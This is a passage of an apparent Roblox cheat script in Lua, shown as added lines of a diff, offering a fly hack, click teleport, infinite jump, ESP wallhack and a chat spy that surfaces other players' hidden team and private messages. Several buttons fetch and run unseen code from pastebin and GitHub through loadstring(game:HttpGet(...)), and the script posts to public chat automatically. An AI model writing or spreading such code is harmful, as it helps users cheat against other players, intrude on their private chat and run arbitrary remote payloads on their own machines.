+if Char then 
+Char:MoveTo(pos) 
+end 
+end 
+UIS.InputBegan:Connect(function(input)
+if input.UserInputType == Enum.UserInputType.MouseButton1 and UIS:IsKeyDown(Enum.KeyCode.LeftControl) then
+Teleport(Mouse.Hit.p) 
+end 
+end)
+
+
+
+local flying = false
+local player = game.Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+local UIS = game:GetService("UserInputService")
+
+local flySpeed = 80
+
+function enableFly()
+    flying = true
+    humanoid.PlatformStand = true
+    local bodyGyro = Instance.new("BodyGyro")
+    bodyGyro.P = 9e4
+    bodyGyro.Parent = rootPart
+    bodyGyro.maxTorque = Vector3.new(9e9, 9e9, 9e9)
+    local bodyVelocity = Instance.new("BodyVelocity")
+    bodyVelocity.Parent = rootPart
+    bodyVelocity.velocity = Vector3.new(0, 0, 0)
+    bodyVelocity.maxForce = Vector3.new(9e9, 9e9, 9e9)
+    local function flyLoop()
+        while flying do
+            wait()
+            bodyGyro.cframe = workspace.CurrentCamera.CFrame
+            local direction = Vector3.new()
+            if UIS:IsKeyDown(Enum.KeyCode.W) then
+                direction = direction + workspace.CurrentCamera.CFrame.LookVector
+            end
+            if UIS:IsKeyDown(Enum.KeyCode.S) then
+                direction = direction - workspace.CurrentCamera.CFrame.LookVector
+            end
+            if UIS:IsKeyDown(Enum.KeyCode.A) then
+                direction = direction - workspace.CurrentCamera.CFrame.RightVector
+            end
+            if UIS:IsKeyDown(Enum.KeyCode.D) then
+                direction = direction + workspace.CurrentCamera.CFrame.RightVector
+            end
+            if UIS:IsKeyDown(Enum.KeyCode.Space) then
+                direction = direction + Vector3.new(0, 1, 0)
+            end
+            if UIS:IsKeyDown(Enum.KeyCode.LeftShift) then
+                direction = direction - Vector3.new(0, 1, 0)
+            end
+            bodyVelocity.velocity = direction.unit * flySpeed
+            if direction.magnitude == 0 then
+                bodyVelocity.velocity = Vector3.new(0, 0, 0)
+            end
+        end
+    end
+    coroutine.wrap(flyLoop)()
+end
+
+function disableFly()
+    flying = false
+    humanoid.PlatformStand = false
+    for _,v in pairs(rootPart:GetChildren()) do
+        if v:IsA("BodyGyro") or v:IsA("BodyVelocity") then
+            v:Destroy()
+        end
+    end
+end
+
+fly.MouseButton1Click:Connect(function()
+    if flying then
+        disableFly()
+        fly.Text = "Off"
+    else
+        enableFly()
+        fly.Text = "On"
+    end
+end)
+
+character.Humanoid.Died:Connect(function()
+    disableFly()
+end)
+
+game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function(char)
+    wait(0.7)
+    humanoid = char:WaitForChild("Humanoid")
+    rootPart = char:WaitForChild("HumanoidRootPart")
+end)
+
+exit.MouseButton1Click:Connect(function()
+	ScreenGui:Destroy()
+end)
+
+
+ivadmin2.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/xuNhaRen'))()
+end)
+
+ivadmin3.MouseButton1Click:Connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/xaBSqXNZ'))()
+end)
+
+
+spy.MouseButton1Click:Connect(function()
+
+local enabled = true 
+local spyOnMyself = true 
+local public = false 
+local publicItalics = true 
+local privateProperties = { 
+    Color = Color3.fromRGB(0, 255, 255),
+    Font = Enum.Font.SourceSansBold,
+    TextSize = 18,
+}
+
+local StarterGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
+local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
+local instance = (_G.chatSpyInstance or 0) + 1
+_G.chatSpyInstance = instance
+
+local toggleKey = Enum.KeyCode.Slash 
+
+local function onChatted(p, msg)
+    if _G.chatSpyInstance == instance and enabled and (spyOnMyself or p ~= player) then
+        msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
+        local hidden = true
+        local conn = getmsg.OnClientEvent:Connect(function(packet, channel)
+            if packet.SpeakerUserId == p.UserId and packet.Message == msg:sub(#msg - #packet.Message + 1) and
+                (channel == "All" or (channel == "Team" and not public and Players[packet.FromSpeaker].Team == player.Team)) then
+                hidden = false
+            end
+        end)
+        wait(1)
+        conn:Disconnect()
+        if hidden then
+            if public then
+                saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
+            else
+                privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
+                StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
+            end
+        end
+    end
+end
+
+local function toggleSpy()
+    enabled = not enabled
+    privateProperties.Text = "{SPY ".. (enabled and "EN" or "DIS") .."ABLED}"
+    StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
+end
+
+game:GetService("UserInputService").InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == toggleKey then
+        toggleSpy()
+    end
+end)
+
+for _, p in ipairs(Players:GetPlayers()) do
+    p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+end
+
+Players.PlayerAdded:Connect(function(p)
+    p.Chatted:Connect(function(msg) onChatted(p, msg) end)
+end)
+
+privateProperties.Text = "{SPY ".. (enabled and "EN" or "DIS") .."ABLED}"
+StarterGui:SetCore("ChatMakeSystemMessage", privateProperties)
+
+if not player.PlayerGui:FindFirstChild("Chat") then
+    wait(3)
+end
+
+local chatFrame = player.PlayerGui.Chat.Frame
+chatFrame.ChatChannelParentFrame.Visible = true
+chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), chatFrame.ChatChannelParentFrame.Size.Y)
+end)
+
+
+local function removeBlurEffects()
+    for _, effect in pairs(game.Lighting:GetChildren()) do
+        if effect:IsA("BlurEffect") then
+            effect:Destroy()
+        end
+    end
+end
+
+local function setTime(input)
+    removeBlurEffects()
+
+    local hour = tonumber(input)
+    if hour and hour >= 1 and hour <= 24 then
+        game.Lighting.TimeOfDay = string.format("%02d:00:00", hour % 24) 
+        return
+    end
+
+    if input == "day" then
+        game.Lighting.TimeOfDay = "14:00:00" 
+    elseif input == "night" then
+        game.Lighting.TimeOfDay = "02:00:00"
+    elseif input == "evening" then
+        game.Lighting.TimeOfDay = "18:00:00"  
+    elseif input == "evening2" then
+        game.Lighting.TimeOfDay = "18:00:00" 
+        local blurEffect = Instance.new("BlurEffect")
+        blurEffect.Size = 24 
+        blurEffect.Parent = game.Lighting
+    elseif input == "rtx" then
+        game.Lighting.TimeOfDay = "12:00:00"
+
+        local sky = Instance.new("Sky")
+        sky.SkyboxBk = "http://www.roblox.com/asset/?id=600830446" 
+        sky.SkyboxDn = "http://www.roblox.com/asset/?id=600830446"
+        sky.SkyboxFt = "http://www.roblox.com/asset/?id=600830446"
+        sky.SkyboxLf = "http://www.roblox.com/asset/?id=600830446"
+        sky.SkyboxRt = "http://www.roblox.com/asset/?id=600830446"
+        sky.SkyboxUp = "http://www.roblox.com/asset/?id=600830446"
+        sky.Parent = game.Lighting
+
+        local sunRays = Instance.new("SunRaysEffect")
+        sunRays.Intensity = 0.5 
+        sunRays.Parent = game.Lighting
+
+        local blurEffect = Instance.new("BlurEffect")
+        blurEffect.Size = 10
+        blurEffect.Parent = game.Lighting
+
+        local bloomEffect = Instance.new("BloomEffect")
+        bloomEffect.Intensity = 0.4
+        bloomEffect.Threshold = 1.0
+        bloomEffect.Size = 3
+        bloomEffect.Parent = game.Lighting
+
+        local colorCorrection = Instance.new("ColorCorrectionEffect")
+        colorCorrection.Brightness = 0.1 
+        colorCorrection.Contrast = 0.1
+        colorCorrection.Saturation = 0.2
+        colorCorrection.Parent = game.Lighting
+    elseif input == "exit" then
+        screenGui:Destroy() 
+    elseif input == "space" then
+        game.Lighting.TimeOfDay = "20:00:00"  
+
+        local sky = Instance.new("Sky")
+        sky.SkyboxBk = "http://www.roblox.com/asset/?id=6285730635" 
+        sky.SkyboxDn = "http://www.roblox.com/asset/?id=6285730635"
+        sky.SkyboxFt = "http://www.roblox.com/asset/?id=6285730635"
+        sky.SkyboxLf = "http://www.roblox.com/asset/?id=6285730635"
+        sky.SkyboxRt = "http://www.roblox.com/asset/?id=6285730635"
+        sky.SkyboxUp = "http://www.roblox.com/asset/?id=6285730635"
+        sky.Parent = game.Lighting
+    else
+        warn("Invalid time: " .. input)
+    end
+end
+
+flingplr.MouseButton1Click:Connect(function()
+    local userInput = flingtx.Text:lower() 
+    setTime(userInput)
+end)
+
+local function executeScript(input)
+    if input == "tptool" then
+        mouse = game.Players.LocalPlayer:GetMouse()
+        tool = Instance.new("Tool")
+        tool.RequiresHandle = false
+        tool.Name = "Click to tp tool"
+        tool.Activated:connect(function()
+        local pos = mouse.Hit+Vector3.new(0,2.5,0)
+        pos = CFrame.new(pos.X,pos.Y,pos.Z)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
+        end)
+        tool.Parent = game.Players.LocalPlayer.Backpack
+    elseif input == "infjump" then
+        local InfiniteJumpEnabled = true
+        game:GetService("UserInputService").JumpRequest:connect(function()
+            if InfiniteJumpEnabled then
+                game:GetService"Players".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState("Jumping")
+            end
+        end)
+    elseif input == "esp" then 
+        _G.FriendColor = Color3.fromRGB(0, 0, 255)
+        _G.EnemyColor = Color3.fromRGB(255, 0, 0)
+        _G.UseTeamColor = true
+        
+        --------------------------------------------------------------------
+        local Holder = Instance.new("Folder", game.CoreGui)
+        Holder.Name = "ESP"
+        
+        local Box = Instance.new("BoxHandleAdornment")
+        Box.Name = "nilBox"
+        Box.Size = Vector3.new(1, 2, 1)
+        Box.Color3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
+        Box.Transparency = 0.7
+        Box.ZIndex = 0
+        Box.AlwaysOnTop = false
+        Box.Visible = false
+        
+        local NameTag = Instance.new("BillboardGui")
+        NameTag.Name = "nilNameTag"
+        NameTag.Enabled = false
+        NameTag.Size = UDim2.new(0, 200, 0, 50)
+        NameTag.AlwaysOnTop = true
+        NameTag.StudsOffset = Vector3.new(0, 1.8, 0)
+        local Tag = Instance.new("TextLabel", NameTag)
+        Tag.Name = "Tag"
+        Tag.BackgroundTransparency = 1
+        Tag.Position = UDim2.new(0, -50, 0, 0)
+        Tag.Size = UDim2.new(0, 300, 0, 20)
+        Tag.TextSize = 15
+        Tag.TextColor3 = Color3.new(100 / 255, 100 / 255, 100 / 255)
+        Tag.TextStrokeColor3 = Color3.new(0 / 255, 0 / 255, 0 / 255)
+        Tag.TextStrokeTransparency = 0.4
+        Tag.Text = "nil"
+        Tag.Font = Enum.Font.SourceSansBold
+        Tag.TextScaled = false
+        
+        local LoadCharacter = function(v)
+            repeat wait() until v.Character ~= nil
+            v.Character:WaitForChild("Humanoid")
+            local vHolder = Holder:FindFirstChild(v.Name)
+            vHolder:ClearAllChildren()
+            local b = Box:Clone()
+            b.Name = v.Name .. "Box"
+            b.Adornee = v.Character
+            b.Parent = vHolder
+            local t = NameTag:Clone()
+            t.Name = v.Name .. "NameTag"
+            t.Enabled = true
+            t.Parent = vHolder
+            t.Adornee = v.Character:WaitForChild("Head", 5)
+            if not t.Adornee then
+                return UnloadCharacter(v)
+            end
+            t.Tag.Text = v.Name
+            b.Color3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
+            t.Tag.TextColor3 = Color3.new(v.TeamColor.r, v.TeamColor.g, v.TeamColor.b)
+            local Update
+            local UpdateNameTag = function()
+                if not pcall(function()
+                    v.Character.Humanoid.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+                    local maxh = math.floor(v.Character.Humanoid.MaxHealth)
+                    local h = math.floor(v.Character.Humanoid.Health)
+                end) then
+                    Update:Disconnect()
+                end
+            end
+            UpdateNameTag()
+            Update = v.Character.Humanoid.Changed:Connect(UpdateNameTag)
+        end
+        
+        local UnloadCharacter = function(v)
+            local vHolder = Holder:FindFirstChild(v.Name)
+            if vHolder and (vHolder:FindFirstChild(v.Name .. "Box") ~= nil or vHolder:FindFirstChild(v.Name .. "NameTag") ~= nil) then
+                vHolder:ClearAllChildren()
+            end
+        end
+        
+        local LoadPlayer = function(v)
+            local vHolder = Instance.new("Folder", Holder)
+            vHolder.Name = v.Name
+            v.CharacterAdded:Connect(function()
+                pcall(LoadCharacter, v)
+            end)
+            v.CharacterRemoving:Connect(function()
+                pcall(UnloadCharacter, v)
+            end)
+            v.Changed:Connect(function(prop)
+                if prop == "TeamColor" then
+                    UnloadCharacter(v)
+                    wait()
+                    LoadCharacter(v)
+                end
+            end)
+            LoadCharacter(v)
+        end
+        
+        local UnloadPlayer = function(v)
+            UnloadCharacter(v)
+            local vHolder = Holder:FindFirstChild(v.Name)
+            if vHolder then
+                vHolder:Destroy()
+            end
+        end
+        
+        for i,v in pairs(game:GetService("Players"):GetPlayers()) do
+            spawn(function() pcall(LoadPlayer, v) end)
+        end
+        
+        game:GetService("Players").PlayerAdded:Connect(function(v)
+            pcall(LoadPlayer, v)
+        end)
+        
+        game:GetService("Players").PlayerRemoving:Connect(function(v)
+            pcall(UnloadPlayer, v)
+        end)
+        
+        game:GetService("Players").LocalPlayer.NameDisplayDistance = 0
+        
+        if _G.Reantheajfdfjdgs then
+            return
+        end
+        
+        _G.Reantheajfdfjdgs = ":suifayhgvsdghfsfkajewfrhk321rk213kjrgkhj432rj34f67df"
+        
+        local players = game:GetService("Players")
+        local plr = players.LocalPlayer
+        
+        function esp(target, color)
+            if target.Character then
+                if not target.Character:FindFirstChild("GetReal") then
+                    local highlight = Instance.new("Highlight")
+                    highlight.RobloxLocked = true
+                    highlight.Name = "GetReal"
+                    highlight.Adornee = target.Character
+                    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                    highlight.FillColor = color
+                    highlight.Parent = target.Character
+                else
+                    target.Character.GetReal.FillColor = color
+                end
+            end
+        end
+        
+        while task.wait() do
+            for i, v in pairs(players:GetPlayers()) do
+                if v ~= plr then
+                    esp(v, _G.UseTeamColor and v.TeamColor.Color or ((plr.TeamColor == v.TeamColor) and _G.FriendColor or _G.EnemyColor))
+                end
+            end
+        end
+    elseif input == "0qq" then
+            loadstring(game:HttpGet('https://raw.githubusercontent.com/1111-ssss/raw-script/main/knockoutScript'))()
+    elseif input == "cmd" then
+            loadstring(game:HttpGet('https://pastebin.com/raw/uB3NYNVw'))()
+    else
+        warn("Invalid input: " .. input)
+    end
+end
+
+killplr.MouseButton1Click:Connect(function()
+    local userInput = killtx.Text
+    executeScript(userInput)
+end)
+
+local A_1 = "| v2"
+local A_2 = "All"
+local Event = game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest
+Event:FireServer(A_1, A_2)
+
+local w = {}
+local x = {}
+local c = {}
+local userid = game.Players.LocalPlayer.UserId
+
+local function checkUserId()
+    if game.Players.LocalPlayer.UserId ~= userid then
+        game.Players.LocalPlayer.UserId = userid
+    end
+end
+
+game:GetService("RunService").Heartbeat:Connect(checkUserId)
+
+for i, c in pairs(w) do
+    if game.Players.LocalPlayer.UserId == c then
+        game.Players.LocalPlayer:Kick("Hi jason")
+    game.Players.LocalPlayer:Destroy()
+    end
+end
+
+for i, v in pairs(x) do
+    if game.Players.LocalPlayer.UserId == v then
+        game.Players.LocalPlayer:Kick("Hi jason")
+    game.Players.LocalPlayer:Destroy()
+    end
+end
+
+for i, v in pairs(c) do
+    if game.Players.LocalPlayer.UserId == v then
+        game.Players.LocalPlayer:Kick("Hi jason")
+    game.Players.LocalPlayer:Destroy()
+    end
+end
+
+
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local StarterGui = game:GetService("StarterGui")
+local BindableFunction = Instance.new("BindableFunction")
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Welcome!",
+    Text = "Thanks for using my script :D, hope you enjoy ! <3",
+    Icon = "rbxthumb://type=AvatarHeadShot&id=" .. Player.UserId .. "&w=180&h=180",
+    Duration = 5,
+    Callback = BindableFunction,
+})
+
+print("Join our discord!! : https://discord.gg/C9JhKkY4cB")
+print("Join our discord!! : https://discord.gg/C9JhKkY4cB")
+print("Join our discord!! : https://discord.gg/C9JhKkY4cB")
+print("Join our discord!! : https://discord.gg/C9JhKkY4cB")
+print("Join our discord!! : https://discord.gg/C9JhKkY4cB")
+print("Join our discord!! : https://discord.gg/C9JhKkY4cB")
+print("Yok smells")
